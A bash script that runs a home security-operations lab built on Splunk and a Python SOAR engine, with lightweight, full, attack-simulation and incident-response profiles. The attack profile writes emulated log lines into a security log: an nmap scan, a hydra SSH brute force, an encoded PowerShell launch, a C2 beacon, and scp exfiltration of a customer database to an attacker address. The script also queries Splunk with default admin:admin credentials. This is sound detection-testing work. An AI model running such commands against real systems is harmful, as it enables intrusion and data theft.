#!/usr/bin/env bash
# ==============================================================================
# Enterprise SOC Multi-Profile Controller
# Enables running an advanced SOC lab within 8GB RAM host constraints by
# orchestrating operational modes (Lightweight, Full SOC, Attack Simulation, IR)
# and allowing resource-heavy components to run sequentially.
# ==============================================================================

set -e

LAB_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
SOAR_DIR="${LAB_DIR}/soar"
SCRIPTS_DIR="${LAB_DIR}/scripts"
SECURITY_LOG="/var/log/security_lab.log"
CASES_DIR="/var/log/soar_cases"
BLOCKLIST_FILE="/var/log/soar_blocklist.txt"
SINKHOLE_FILE="/var/log/soar_dns_sinkhole.log"

GREEN="\033[0;32m"
BLUE="\033[0;34m"
CYAN="\033[0;36m"
YELLOW="\033[1;33m"
RED="\033[0;31m"
BOLD="\033[1m"
NC="\033[0m"

function show_banner() {
    echo -e "${CYAN}${BOLD}"
    echo "======================================================================"
    echo "         🛡️  ENTERPRISE SOC LAB CONTROLLER & PROFILE MANAGER          "
    echo "======================================================================"
    echo -e "${NC}"
}

function check_hardware() {
    echo -e "${BLUE}[HARDWARE TELEMETRY & RESOURCE CHECK]${NC}"
    TOTAL_RAM=$(free -h | awk '/Mem:/ {print $2}')
    USED_RAM=$(free -h | awk '/Mem:/ {print $3}')
    AVAIL_RAM=$(free -h | awk '/Mem:/ {print $7}')
    SWAP_USED=$(free -h | awk '/Swap:/ {print $3}')
    DISK_AVAIL=$(df -h / | awk 'NR==2 {print $4}')
    CPU_CORES=$(nproc)

    echo -e "  • Total RAM: ${BOLD}${TOTAL_RAM}${NC} | Used: ${YELLOW}${USED_RAM}${NC} | Available: ${GREEN}${AVAIL_RAM}${NC}"
    echo -e "  • Swap Used: ${SWAP_USED} | CPU Cores: ${CPU_CORES} (AMD Ryzen 5 5600H)"
    echo -e "  • NVMe Disk Space Available: ${GREEN}${DISK_AVAIL}${NC}"

    if systemctl is-active --quiet Splunkd; then
        SPLUNK_PID=$(pgrep -o -f splunkd || echo "N/A")
        echo -e "  • Splunk Enterprise: ${GREEN}RUNNING${NC} (PID: ${SPLUNK_PID})"
    else
        echo -e "  • Splunk Enterprise: ${YELLOW}STOPPED / INACTIVE${NC}"
    fi
    echo ""
}

function profile_lightweight() {
    show_banner
    echo -e "${BOLD}▶ ACTIVATING PROFILE 1: LIGHTWEIGHT SOC (Baseline Daily Ops)${NC}"
    echo -e "  Target RAM Consumption: ~1.8 - 2.2 GB"
    echo -e "  Components: Splunk Enterprise + Python SOAR + Baseline Security Logs\n"
    
    check_hardware

    if ! systemctl is-active --quiet Splunkd; then
        echo -e "${YELLOW}[*] Starting Splunk Enterprise service...${NC}"
        sudo systemctl start Splunkd
        sleep 2
    fi

    echo -e "${GREEN}[✔] Ingesting baseline host telemetry...${NC}"
    sudo journalctl -n 15 --no-pager -o short-iso | sudo tee -a /var/log/kali_auth.log > /dev/null

    echo -e "${GREEN}[✔] Triggering Baseline SOAR Playbook 1 (Brute Force)...${NC}"
    python3 "${SOAR_DIR}/soar_engine.py" "Brute Force Multiple Failed Logins" "192.168.1.105" "admin" "Failed password for admin from 192.168.1.105"

    echo -e "\n${GREEN}✔ Profile 1 (Lightweight SOC) is ACTIVE and healthy.${NC}"
}

function profile_full() {
    show_banner
    echo -e "${BOLD}▶ ACTIVATING PROFILE 2: FULL ENTERPRISE SOC${NC}"
    echo -e "  Target RAM Consumption: ~2.3 - 2.8 GB"
    echo -e "  Components: Splunk + Multi-Source Telemetry (Sysmon, Linux Audit, Web, FIM, DNS) + Multi-Playbook SOAR\n"

    check_hardware

    if ! systemctl is-active --quiet Splunkd; then
        echo -e "${YELLOW}[*] Starting Splunk Enterprise service...${NC}"
        sudo systemctl start Splunkd
        sleep 2
    fi

    echo -e "${BLUE}[1/3] Generating Advanced Multi-Source Telemetry...${NC}"
    python3 "${SCRIPTS_DIR}/advanced_telemetry_generator.py"

    echo -e "\n${BLUE}[2/3] Executing Enterprise Playbook Suite...${NC}"
    # Playbook 3: C2 Network Threat
    python3 "${SOAR_DIR}/soar_engine.py" "Suspicious Outbound Connection" "198.51.100.45" "jdoe" "EventID=3 DestinationIp=198.51.100.45 DestinationPort=4444"
    # Playbook 7: Phishing Investigation
    python3 "${SOAR_DIR}/soar_engine.py" "Phishing Investigation" "login-secure-auth-portal.com" "victim@enterprise-lab.local" "Inbound email flagged: embedded_url=https://login-secure-auth-portal.com/login.php"
    # Playbook 8: File Hash Investigation
    python3 "${SOAR_DIR}/soar_engine.py" "Suspicious File Hash Investigation" "a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90" "system" "Malware sha256=a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d4e5f60718293a4b5c6d7e8f90"

    echo -e "\n${BLUE}[3/3] Querying Splunk SIEM for Ingested Telemetry Types...${NC}"
    sleep 2
    curl -s -k -u admin:admin https://127.0.0.1:8089/services/search/jobs \
        --data-urlencode "search=search index=security_lab earliest=-15m | stats count by app" \
        -d exec_mode=oneshot \
        -d output_mode=json 2>/dev/null | grep -o '{"app":"[^"]*","count":"[^"]*"}' || true

    echo -e "\n${GREEN}✔ Profile 2 (Full Enterprise SOC) execution completed successfully.${NC}"
}

function profile_attack() {
    show_banner
    echo -e "${BOLD}▶ ACTIVATING PROFILE 3: ATTACK SIMULATION MODE (Adversary Emulation)${NC}"
    echo -e "  Focus: Generating active adversary attack chains across the MITRE ATT&CK Matrix\n"

    check_hardware

    echo -e "${RED}[*] Launching Emulated MITRE ATT&CK Chain...${NC}"
    NOW=$(date --iso-8601=seconds)
    HOST_NAME=$(hostname)

    cat <<EOF >> "${SECURITY_LOG}"
${NOW} host=${HOST_NAME} app=attack:recon severity=INFO message="T1046 Network Service Scanning: nmap -sS -p 22,80,443,8000,8089 192.168.1.0/24"
${NOW} host=${HOST_NAME} app=attack:cred severity=WARNING message="T1110.001 Password Guessing: hydra -l admin -P rockyou.txt ssh://192.168.1.50"
${NOW} host=${HOST_NAME} app=attack:exec severity=CRITICAL message="T1059.001 PowerShell Encoded Launch: powershell -e aQBlAHgAIAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAKQA="
${NOW} host=${HOST_NAME} app=attack:c2 severity=CRITICAL message="T1071.001 HTTP C2 Beacon: GET /heartbeat.php HTTP/1.1 Host: c2-beacon-malicious.xyz"
${NOW} host=${HOST_NAME} app=attack:exfil severity=CRITICAL message="T1048.003 Exfiltration Over Alternative Protocol: scp -P 22 /tmp/customer_db.tar.gz attacker@203.0.113.88:/drop/"
EOF

    echo -e "  ${GREEN}✔ Injected 5 Attack Tactics into SIEM Stream:${NC}"
    echo -e "    1. T1046 - Reconnaissance (Nmap port scan)"
    echo -e "    2. T1110 - Credential Access (Hydra brute force)"
    echo -e "    3. T1059 - Execution (PowerShell base64 cradle)"
    echo -e "    4. T1071 - Command & Control (HTTP C2 Beaconing)"
    echo -e "    5. T1048 - Exfiltration (Data exfil over SCP)"

    echo -e "\n${BLUE}[*] Triggering Playbook 6 (Multi-Stage Compromise Response)...${NC}"
    python3 "${SOAR_DIR}/soar_engine.py" "Multi-Stage Compromise Detected" "203.0.113.88" "attacker" "Multi-stage attack sequence observed from 203.0.113.88 targeting corporate DB"

    echo -e "\n${GREEN}✔ Profile 3 (Attack Simulation Mode) complete.${NC}"
}

function profile_ir() {
    show_banner
    echo -e "${BOLD}▶ ACTIVATING PROFILE 4: INCIDENT RESPONSE & FORENSICS MODE${NC}"
    echo -e "  Focus: Case Management, Forensic Triage, Containment Auditing, Post-Mortem\n"

    echo -e "${CYAN}📁 LATEST ACTIVE INCIDENT TICKETS (/var/log/soar_cases):${NC}"
    ls -lt "${CASES_DIR}"/INC-*.json 2>/dev/null | head -n 5 | while read -r line; do
        FPATH=$(echo "$line" | awk '{print $NF}')
        INC_ID=$(basename "$FPATH" .json)
        STATUS=$(grep '"status"' "$FPATH" | head -1 | tr -d '", ' | cut -d: -f2)
        RISK=$(grep '"risk_score"' "$FPATH" | head -1 | tr -d '", ' | cut -d: -f2)
        ALERT=$(grep '"alert_name"' "$FPATH" | head -1 | cut -d: -f2 | tr -d '",')
        echo -e "  • ${BOLD}${INC_ID}${NC} | Status: ${GREEN}${STATUS}${NC} | Risk: ${RED}${RISK}/100${NC} | Alert:${YELLOW}${ALERT}${NC}"
    done

    echo -e "\n${CYAN}🛡️ ACTIVE FIREWALL CONTAINMENT BLOCKLIST (${BLOCKLIST_FILE}):${NC}"
    tail -n 3 "${BLOCKLIST_FILE}" 2>/dev/null | sed 's/^/  /g' || echo "  No active IP blocks."

    echo -e "\n${CYAN}🌐 ACTIVE DNS SINKHOLE RECORDS (${SINKHOLE_FILE}):${NC}"
    tail -n 3 "${SINKHOLE_FILE}" 2>/dev/null | sed 's/^/  /g' || echo "  No active DNS sinkhole entries."

    echo -e "\n${GREEN}✔ Profile 4 (Incident Response Mode) inspection complete.${NC}"
}

function stop_components() {
    show_banner
    echo -e "${YELLOW}[*] Stopping heavy resource components to free RAM...${NC}"
    if systemctl is-active --quiet Splunkd; then
        echo -e "  -> Stopping Splunk Enterprise service..."
        sudo systemctl stop Splunkd
        echo -e "  ${GREEN}✔ Splunkd stopped. Reclaimed ~2.0 GB RAM.${NC}"
    else
        echo -e "  -> Splunk Enterprise is already inactive."
    fi

    # Check for any running docker containers
    RUNNING_DOCKER=$(docker ps -q 2>/dev/null || true)
    if [ -n "${RUNNING_DOCKER}" ]; then
        echo -e "  -> Stopping active Docker containers..."
        docker stop ${RUNNING_DOCKER}
        echo -e "  ${GREEN}✔ Stopped Docker containers.${NC}"
    fi

    echo ""
    check_hardware
    echo -e "${GREEN}✔ All non-essential security services stopped.${NC}"
}

case "$1" in
    lightweight|1)
        profile_lightweight
        ;;
    full|2)
        profile_full
        ;;
    attack|3)
        profile_attack
        ;;
    ir|4)
        profile_ir
        ;;
    status)
        show_banner
        check_hardware
        ;;
    stop)
        stop_components
        ;;
    *)
        show_banner
        echo -e "Usage: $0 {lightweight | full | attack | ir | status | stop}"
        echo ""
        echo "Profiles tailored for 8GB RAM host:"
        echo "  lightweight (1) : Splunk + Python SOAR baseline (minimal RAM footprint)"
        echo "  full        (2) : Full enterprise telemetry (Sysmon/Linux/Web/DNS/FIM) + SOAR suite"
        echo "  attack      (3) : MITRE ATT&CK multi-vector adversary simulation"
        echo "  ir          (4) : Incident response case management & forensic artifact audit"
        echo "  status          : Live hardware (RAM, CPU, Swap, Disk) & service status"
        echo "  stop            : Gracefully stops Splunk & containers to free host RAM"
        echo ""
        exit 1
        ;;
esac
